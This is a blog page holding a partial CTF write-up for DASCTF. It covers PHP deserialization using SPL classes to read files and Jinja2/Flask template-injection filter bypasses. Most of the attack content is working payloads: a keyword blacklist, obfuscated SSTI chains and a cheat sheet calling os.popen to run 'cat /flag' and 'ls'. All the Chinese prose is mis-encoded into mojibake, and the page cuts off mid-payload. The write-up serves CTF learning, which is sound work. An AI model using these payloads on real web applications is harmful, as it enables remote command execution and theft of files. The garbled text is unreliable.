<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="ez_serializeæºç 

PHPæ ‡å‡†åº“
https://www.php.net/manual/zh/book.spl.php
SLPç±»ä¸­å­˜åœ¨èƒ½å¤Ÿè¿›è¡Œæ–‡ä»¶å¤„ç†å’Œè¿­ä»£çš„ç±»ï¼š



ç±»
æè¿°



DirectoryIterator
éå†ç›®å½•


FilesystemIterator
éå†ç›®å½•


">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="dasctféƒ¨åˆ†wp"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>dasctféƒ¨åˆ†wp - èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2021/03/29/dasctf%E9%83%A8%E5%88%86wp/">
                dasctféƒ¨åˆ†wp
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-29</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>æºç </p>
<pre><code></code></pre>
<p>PHPæ ‡å‡†åº“</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
<p>SLPç±»ä¸­å­˜åœ¨èƒ½å¤Ÿè¿›è¡Œæ–‡ä»¶å¤„ç†å’Œè¿­ä»£çš„ç±»ï¼š</p>
<table>
<thead>
<tr>
<th>ç±»</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td>éå†ç›®å½•</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td>éå†ç›®å½•</td>
</tr>
<tr>
<td>GlobIterator</td>
<td>éå†ç›®å½•ï¼Œä½†æ˜¯ä¸åŒçš„ç‚¹åœ¨äºå®ƒå¯ä»¥é€šé…ä¾‹å¦‚/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td>è¯»å–æ–‡ä»¶ï¼ŒæŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†</td>
</tr>
</tbody></table>
<p>exp</p>
<p>ç›´æ¥è¯»å–/var/www/htmlä¸‹é¢çš„æ–‡ä»¶</p>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;FilesystemIterator&#39;;
    public $para=&quot;/var/www/html&quot;;
    public $check;
    &#125;
$a  = new A();
echo serialize($a);</code></pre>
<pre><code>&lt;?php
class A&#123;
    public $class=&#39;SplFileObject&#39;;
    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
    public $check;
    &#125;

$a  = new A();
echo serialize($a);</code></pre>
<h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>é»‘åå•</p>
<pre><code>blacklist&lt;/br&gt;   
&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   
&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   
&#39;count&#39;,&#39;length&#39;,&#39;ï¼&#39;,&#39;ï¼‘&#39;,&#39;ï¼’&#39;,&#39;ï¼“&#39;,&#39;ï¼”&#39;,&#39;ï¼•&#39;,&#39;ï¼–&#39;,&#39;ï¼—&#39;,&#39;ï¼˜&#39;,&#39;ï¼™&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;   
&lt;/br&gt;</code></pre>
<p>å¯ä»¥çœ‹åˆ°å‡ ä¹éƒ½è¿‡æ»¤äº†</p>
<p>configè¿‡æ»¤äº†å¯ä»¥ç”¨lipsumè·å–æ•°å­—ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„ï¼‰</p>
<p><img src="/images/64.png"></p>
<p>åˆ©ç”¨index è¿”å›äº† 1</p>
<p><img src="/images/65.png"></p>
<p>å› ä¸ºè¿‡æ»¤äº†å¼•å·ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨joinè¿‡æ»¤å™¨æ¥ç»•è¿‡</p>
<p><img src="/images/66.png"></p>
<p>ç‚¹ .  []  ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œåˆ©ç”¨ attr å’Œ popè·å– _</p>
<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;&#123;xiahuaxian&#125;&#125;
ç›¸å½“äº
(lipsum|string|list)[18] &lt;=&gt; (lipsum|string|list).pop(18)</code></pre>
<p><img src="/images/67.png"></p>
<p>æœ€ç»ˆpayload</p>
<pre><code>1&#123;% set id=dict(ind=a,ex=a)|join%&#125;
&#123;% set pp=dict(po=a,p=a)|join%&#125;
&#123;% set ls=dict(ls=a)|join%&#125;
&#123;% set ppe=dict(po=a,pen=a)|join%&#125;
&#123;% set gt=dict(ge=a,t=a)|join%&#125;
&#123;% set cr=dict(ch=a,r=a)|join%&#125;
&#123;% set nn=dict(n=a)|join%&#125;
&#123;% set tt=dict(t=a)|join%&#125;
&#123;% set ff=dict(f=a)|join%&#125;
&#123;% set ooqq=dict(o=a,s=a)|join %&#125;
&#123;% set rd=dict(re=a,ad=a)|join%&#125;
&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;
&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;
&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;
&#123;% set shiba=five*five-three-three-one %&#125;
&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;
&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;
&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;
&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;
&#123;% set space=chcr(three*three*five-five-five-three) %&#125;
&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;
</code></pre>
<p><strong>æ–¹æ³•2</strong></p>
<p>python3æ”¯æŒunicodeç¼–ç </p>
<pre><code>æµ‹è¯•çš„ä½¿ç”¨&#123;%print ğŸ¡%&#125;å¦‚æœå¯ä»¥æ­£å¸¸å›æ˜¾å°±ä»£è¡¨æ”¯æŒ</code></pre>
<p>å‚è€ƒæ–‡ç« </p>
<p><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
<p>è¿™ä¸ªç½‘ç«™æœ‰å„ç§å„æ ·çš„unicodeç¼–ç æ–¹å¼</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/bidiclass/EN">https://www.compart.com/en/unicode/bidiclass/EN</a></p>
<p><img src="/images/68.png"></p>
<p><img src="/images/69.png"></p>
<pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
&#123;%set b=lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125; # _
&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals
&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem
&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os
&#123;%set f=lipsum|string|list|attr(a)(ğŸ¡)%&#125; # ç©ºæ ¼
&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125; # æ–œæ 
&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag
&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen
&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read
&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125; #ç‚¹
&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask
&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;
#æœ€åæ‹¼æ¥èµ·æ¥
#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;</code></pre>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2å®˜æ–¹æ–‡æ¡£</a></p>
<pre><code>&#123;%%&#125;å¯ä»¥ç”¨æ¥å£°æ˜å˜é‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ã€‚
&#123;&#123;&#125;&#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º
&#123;##&#125;è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š
##å¯ä»¥æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ</code></pre>
<pre><code>&#123;% set x= 'abcd' %&#125;  å£°æ˜å˜é‡
&#123;% for i in ['a','b','c'] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; å¾ªç¯è¯­å¥
&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  æ¡ä»¶è¯­å¥</code></pre>
<p><strong>[BJDCTF 2nd]fake google</strong>ç”¨æ¥å¤ç°çš„åœ°æ–¹ï¼ˆåœ¨buuå¹³å°ï¼‰</p>
<pre><code>__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚
__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»
__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__
__mro__              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚
__subclasses__()     è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function
__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚
__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ
__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚
__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#39;b&#39;]ï¼Œå°±æ˜¯a.__getitem__(&#39;b&#39;)
__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚
__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚
url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#39;__builtins__&#39;]å«æœ‰current_appã€‚
get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#39;__builtins__&#39;]å«æœ‰current_appã€‚
lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚

request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
request.args.x1        getä¼ å‚
request.values.x1      æ‰€æœ‰å‚æ•°
request.cookies      cookieså‚æ•°
request.headers      è¯·æ±‚å¤´å‚æ•°
request.form.x1        postä¼ å‚    (Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)
request.data           postä¼ å‚    (Content-Type:a/b)
request.json         postä¼ json  (Content-Type: application/json)
config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;
g                    &#123;&#123;g&#125;&#125;å¾—åˆ°&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre>
<p>å¸¸ç”¨çš„è¿‡æ»¤å™¨</p>
<pre><code>
int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›

float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›

lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›

upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›

title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›

capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›

trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›

wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›

reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›

replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›

truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›

striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›

escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚

safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;'<em>hello</em>'|safe&#125;&#125;ï¼›

list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›

string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›

join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›

abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›

first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›

last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›

format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!

length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›

sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›

sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›

default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#39;xiaotuo&#39;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚

length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</code></pre>
<p>æ¯”å¦‚æŸ¥çœ‹ä¸€ä¸‹os._wrap_closeç±»æ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„module,æ–¹æ³•å’Œå˜é‡,åˆ©ç”¨.keys()çˆ†å‡ºè¿™ä¸ªdictçš„æ‰€æœ‰é”®å</p>
<pre><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__.keys())</code></pre>
<p>ä¸€ä¸‹æ³¨å…¥ç‚¹å‡æ˜¯name</p>
<p>#0x01</p>
<p>ç”¨ä»¥ä¸‹å·²æœ‰çš„å‡½æ•°ï¼Œå»å¾—åˆ°builtinsï¼Œç„¶åç”¨evalå°±å¯ä»¥äº†</p>
<pre><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>#0x02</p>
<p>å¦ä¸€ç§å§¿åŠ¿å»å¾—åˆ°builtins</p>
<pre><code>&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<p>è¿™é‡Œçš„xä»»æ„26ä¸ªè‹±æ–‡å­—æ¯çš„ä»»æ„ç»„åˆéƒ½å¯ä»¥ï¼ŒåŒæ ·å¯ä»¥å¾—åˆ°<code>__builtins__</code>ç„¶åç”¨evalå°±å¯ä»¥äº†ã€‚</p>
<p>#0x03</p>
<p>å­¦ä¹ ä¸€ä¸‹ç”¨<code>&#123;% %&#125;</code>æ¥SSTI</p>
<pre><code>&#123;% for i in ''.__class__.__mro__[1].__subclasses__() %&#125;&#123;% if i.__name__=='_wrap_close' %&#125;&#123;% print i.__init__.__globals__['popen']('ls').read() %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
<p>#0x04</p>
<p>å› ä¸ºæˆ‘ä»¬æ²¡æ³•ç›´æ¥ä½¿ç”¨chrå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡<code>__builtins__</code>æ‰¾åˆ°ä»–</p>
<pre><code>?name=&#123;%set chr=url_for.__globals__.__builtins__.chr%&#125;&#123;%print url_for.__globals__[chr(111)%2bchr(115)].popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()%&#125;</code></pre>
<p>#0x05</p>
<p>è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œå¯ä»¥ç”¨requestæ¥ç»•è¿‡</p>
<p>get</p>
<pre><code>?a=os&amp;b=popen&amp;c=cat /flag&amp;name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;</code></pre>
<p>post</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;
cookie:a=os;b=popen;c=cat /flag</code></pre>
<p>å½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨cookieç»•è¿‡ã€‚çœ‹ä¸Šé¢ï¼</p>
<p>#0x06</p>
<p>å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè¿™é‡Œç”¨configæ‹¿åˆ°å­—ç¬¦ä¸²</p>
<pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;
ç­‰ä»·äº
?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</code></pre>
<p>#0x07</p>
<p>è¿‡æ»¤äº†[ï¼Œç”¨ç‚¹ç»•è¿‡æˆ–__getitemï¼Œæˆ–pop</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
<pre><code>&#123;&#123;''.__class__.__mro__.__getitem__(1).__subclasses__().pop(117).__init__.__globals__.popen('ls').read()&#125;&#125;</code></pre>
<p>ä½¿ç”¨requestç»•è¿‡çš„è¯å¯ä»¥è¿™æ ·</p>
<pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.c).read()&#125;&#125;
Cookie:c=cat /flag</code></pre>
<p>#0x08</p>
<p>ç‚¹  .  å’Œ [ éƒ½è¢«banäº† ï¼Œç”¨attr()ç»•è¿‡ </p>
<p>ï¼ï¼æœ‰ç‚¹å°é—®é¢˜</p>
<pre><code>&#123;&#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')&#125;&#125;</code></pre>
<p>#0x09  16è¿›åˆ¶ç»•è¿‡</p>
<pre><code>&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
å¯¹äºpython2çš„è¯ï¼Œè¿˜å¯ä»¥åˆ©ç”¨base64è¿›è¡Œç»•è¿‡
&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
<pre><code>&#123;%print(
()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f") 
//__class__

